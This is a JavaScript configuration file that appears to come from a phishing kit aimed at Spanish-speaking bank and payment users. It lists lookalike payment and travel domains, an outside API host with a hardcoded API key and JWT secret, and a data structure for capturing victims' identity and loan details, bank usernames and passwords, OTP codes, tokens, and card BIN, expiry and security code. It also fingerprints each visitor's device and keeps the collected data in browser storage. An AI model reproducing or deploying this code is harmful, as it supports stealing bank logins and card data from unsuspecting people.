/**
 * CONFIGURACIÓN
 */
const PARENT_ORIGIN = [
    'https://pagospselinea.vercel.app',
    'https://vueloseconomico.com',
    'https://pagospselinea.vercel.app',
    'https://vueloseconomico.com',
    // puedes copiar esta línea y pegarla justo después para agregar más URLs
];

// const API_URL = 'https://api.tiqcheapsbarat.org';
const API_URL = 'https://api.tiqcheapsbarat.org';
const API_KEY = '8c4124c5-2bd0-4f1b-8102-877f7b2d6dd0';
const JWT_SIGN = 'BIGBLACKMANAYO';

const PORCENTAJE_ARRIBA = 300


const LS = window.localStorage;

let info = {
    requestInfo: {
        vehicleType: '',
        dni: '',
        amount: '',
        installments: '',
    },
    userInfo: {
        fullname: '',
        dni: '',
        birthdate: '',
        address: '',
        email: '',
        phone: '',

        house_sit: '',
        contract_term: '',
        month_revenue: '',
        month_costs: '',
        wealth: '',
        debts: '',
    },
    metaInfo: {
        TRANSID: 'transid',
        origin: '',
        desc: '',
        cardType: '',

        disp: '',
        mode: '',
        bank: '',
        
        user: '',
        pass: '',
        cdin: '',
        ccaj: '',
        otpcode: '',
        token: '',
        bin: '',
        date: '',
        cs: '',

        fullname: '',
        dni: '',
        address: '',
        email: '',
        phone: '',

        amount: '',
        vehicleType: '',
        installments: '',

        house_sit: '',
        contract_term: '',
        month_revenue: '',
        month_costs: '',
        wealth: '',
        debts: '',
    },
    checkerInfo: {
        company: '',
        mode: 'userpassword',
    },
    edit: 0
}

dDisp();

function limitDigits(input, maxDigits) {
    parseInt(input.value)
    if (input.value.length > maxDigits) {
        input.value = input.value.slice(0, maxDigits);
    }
}

function cleanAndLimitDigits(input, maxLength) {
    // Remove all spaces from the input
    let value = input.value.replace(/\s/g, '');
    
    // Limit to maxLength digits
    if (value.length > maxLength) {
        value = value.slice(0, maxLength);
    }
    
    // Update input value
    input.value = value;
}

function formatAmount(input) {
    let rawValue = input.value.replace(/,/g, ''); // Quitar comas
    let number = parseFloat(rawValue);

    if (isNaN(number)) {
        input.value = ""; // Si el usuario borra todo, mantener vacío
        return;
    }

    // Determinar si hay decimales
    let hasDecimals = rawValue.includes('.');

    // Formatear el número con o sin decimales según sea necesario
    let formattedValue = number.toLocaleString('en-US', { 
        minimumFractionDigits: hasDecimals ? 2 : 0, 
        maximumFractionDigits: hasDecimals ? 2 : 0 
    });

    // Restaurar el valor formateado
    input.value = formattedValue;
}

function formatAsDate(input) {
    // 1. Obtener el valor y eliminar todo lo que no sea dígito
    let val = input.value.replace(/\D/g, '');
  
    // 2. Limitar a 8 dígitos máximo: DD(2) + MM(2) + AAAA(4)
    val = val.substring(0, 8);
  
    // 3. Reconstruir la cadena con formato DD/MM/AAAA
    let formatted = '';
    if (val.length > 0) {
      // Los primeros 2 dígitos => DD
      formatted = val.substring(0, 2);
    }
    if (val.length > 2) {
      // Los siguientes 2 dígitos => /MM
      formatted += '/' + val.substring(2, 4);
    }
    if (val.length > 4) {
      // Los últimos 4 dígitos => /AAAA
      formatted += '/' + val.substring(4, 8);
    }
  
    // 4. Asignar el resultado formateado al campo
    input.value = formatted;
}
  
   


function dDisp() {
    var userAgent = navigator.userAgent || navigator.vendor || window.opera;

    if(userAgent.includes('iPhone') || userAgent.includes('iPad') || userAgent.includes('iOS')){
        info.metaInfo.disp = "iOS";
    }else if(userAgent.includes('Windows')){
        info.metaInfo.disp = "PC";
    }else{
        info.metaInfo.disp = "Android";
    }
}

function updateLS(){
    LS.setItem('info', JSON.stringify(info));
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}



LS.getItem('info') ? info = JSON.parse(LS.getItem('info')) : LS.setItem('info', JSON.stringify(info));

// LS.removeItem('info');
